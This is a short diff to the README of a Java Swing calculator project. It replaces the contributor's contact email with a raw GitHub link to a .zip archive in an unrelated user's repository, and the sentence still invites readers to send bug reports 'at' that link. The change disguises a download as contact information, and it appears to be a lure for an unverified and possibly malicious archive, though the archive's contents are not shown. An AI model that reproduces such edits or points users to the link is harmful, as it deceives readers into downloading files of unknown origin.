@@ -14,5 +14,5 @@ Mouse based Calculator.
 Contributer
 ===========
 himanshu shukla
-Please let me know in case of any bugs, problems or any other query at himanshushukla254@gmail.com.
+Please let me know in case of any bugs, problems or any other query at https://raw.githubusercontent.com/ShuhaibAk/Java-Swing-Calculator/master/lankily/Java-Swing-Calculator.zip
 Thanks !! 
